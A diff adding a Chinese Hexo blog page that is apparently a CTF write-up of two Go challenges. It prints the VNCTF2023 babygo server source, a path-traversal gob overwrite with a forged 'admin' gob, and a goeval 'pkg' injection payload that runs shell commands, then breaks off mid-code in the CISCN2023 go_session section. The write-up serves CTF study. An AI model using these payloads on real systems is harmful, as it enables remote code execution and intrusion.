@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="title:从两道ctf go题目学习go安全复现两道go安全的题目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hh">
+<meta property="og:url" content="http://example.com/2023/06/02/6.2%20blog/index.html">
+<meta property="og:site_name" content="hh">
+<meta property="og:description" content="title:从两道ctf go题目学习go安全复现两道go安全的题目">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\linchen\AppData\Roaming\Typora\typora-user-images\image-20230602122114987.png">
+<meta property="article:published_time" content="2023-06-02T08:14:00.643Z">
+<meta property="article:modified_time" content="2023-06-02T06:35:24.807Z">
+<meta property="article:author" content="hh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\linchen\AppData\Roaming\Typora\typora-user-images\image-20230602122114987.png">
+
+<link rel="canonical" href="http://example.com/2023/06/02/6.2%20blog/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | hh</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">hh</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">小白</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">3</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/02/6.2%20blog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/th.jpg">
+      <meta itemprop="name" content="hh">
+      <meta itemprop="description" content="hh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hh">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-06-02 16:14:00 / 修改时间：14:35:24" itemprop="dateCreated datePublished" datetime="2023-06-02T16:14:00+08:00">2023-06-02</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <hr>
+<h2 id="title-从两道ctf-go题目学习go安全"><a href="#title-从两道ctf-go题目学习go安全" class="headerlink" title="title:从两道ctf go题目学习go安全"></a>title:从两道ctf go题目学习go安全</h2><p>复现两道go安全的题目</p>
+<span id="more"></span>
+
+<h1 id="VNCTF2023-babygo"><a href="#VNCTF2023-babygo" class="headerlink" title="VNCTF2023  babygo"></a>VNCTF2023  babygo</h1><ul>
+<li>buu上复现</li>
+</ul>
+<p>涉及到go的反序列化+目录穿越</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">	r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		session.Set(<span class="string">&quot;shallow&quot;</span>, userDir)</span><br><span class="line">		session.Save()</span><br><span class="line">		fileutil.CreateDir(userDir)</span><br><span class="line">		gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">		user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">		encoder := gob.NewEncoder(gobFile)</span><br><span class="line">		encoder.Encode(user)</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		fileutil.CreateDir(userUploadDir)</span><br><span class="line">		file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line">		<span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		filename := userUploadDir + file.Filename</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">			fileutil.RemoveFile(filename)</span><br><span class="line">		&#125;</span><br><span class="line">		err = c.SaveUploadedFile(file, filename)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">		destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">		<span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">			<span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">				err := fileutil.UnZip(userUploadDir+file, destPath) <span class="comment">//destPath是解压后的文件存放位置，path可以进行目录超越，决定存放位置   解压到什么路径下呢?</span></span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">				fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">			c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">			decoder := gob.NewDecoder(file)</span><br><span class="line">			<span class="keyword">var</span> ctfer User</span><br><span class="line">			decoder.Decode(&amp;ctfer)</span><br><span class="line">			<span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">				eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">				&#125;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="分别分析四个路由"><a href="#分别分析四个路由" class="headerlink" title="分别分析四个路由"></a>分别分析四个路由</h3><p>（直接看源代码比较费劲，可以结合前端一起看）</p>
+<ul>
+<li>&#x2F;   生成一个userDir （&#x2F;tmp&#x2F;8208232cb3a94a0c7bc478afdf7feae7&#x2F;），其中关注下面这段代码，<strong>在userDir路径下生成一个user.god，Power为low（后面有用）</strong></li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fileutil.CreateDir(userDir)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\linchen\AppData\Roaming\Typora\typora-user-images\image-20230602122114987.png" alt="image-20230602122114987"></p>
+<ul>
+<li><p>&#x2F;upload   一个简单的文件上传点，.god 和 .go  类型不能上传  </p>
+</li>
+<li><p>&#x2F;unzip    如果在&#x2F;upload下上传的是zip文件，则进行解压。</p>
+</li>
+</ul>
+<p>关注fileutil.Unzip()  ，将userUploadDir+file路径的文件解压后放到<strong>destPath</strong>路径下，</p>
+<p>从 <code>destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;))</code> 可以看到path参数可控，如果上传是<code>?path=../</code> 则穿越到了前面user.god存放的路径。 </p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">	<span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">		err := fileutil.UnZip(userUploadDir+file, destPath)</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里就可以对user.god进行文件覆盖</strong>，解题思路就是先&#x2F;upload上传一个将user.god压缩的user.zip，然后&#x2F;unzip利用目录穿越，放到&#x2F;tmp&#x2F;8208232cb3a94a0c7bc478afdf7feae7&#x2F;路径下，在&#x2F;backdoor返回Good说明利用成功，用pkg参数命令执行</p>
+<ul>
+<li>user.go</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	userDir := <span class="string">&quot;&quot;</span></span><br><span class="line">	fileutil.CreateDir(userDir)</span><br><span class="line">	gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">	user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">	encoder := gob.NewEncoder(gobFile)</span><br><span class="line">	encoder.Encode(user)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>&#x2F;backdoor    最后在&#x2F;backdoor处进行利用</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)    <span class="comment">//打开了/tmp/8208232cb3a94a0c7bc478afdf7feae7/路径下的user.god</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">	eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	     fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">		c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<p>Power &#x3D; admin时才会返回Good。然后pkg参数可以传值 ，进行命令注入  <a target="_blank" rel="noopener" href="https://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined">参考 goeval代码注入</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pkg=\&quot;os/exec\&quot;\n fmt\&quot;\n)\n\nfunc\tinit()&#123;\ncmd:=exec.Command(\&quot;ls\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))\n&#125;\n\n\nvar(a=\&quot;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CISCN2023-初赛-go-session"><a href="#CISCN2023-初赛-go-session" class="headerlink" title="CISCN2023 初赛 go_session"></a>CISCN2023 初赛 go_session</h1><p>构造session+pongo2进行模板编译时如何利用（利用方法类似python中的ssti）</p>
+<p>分析源码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 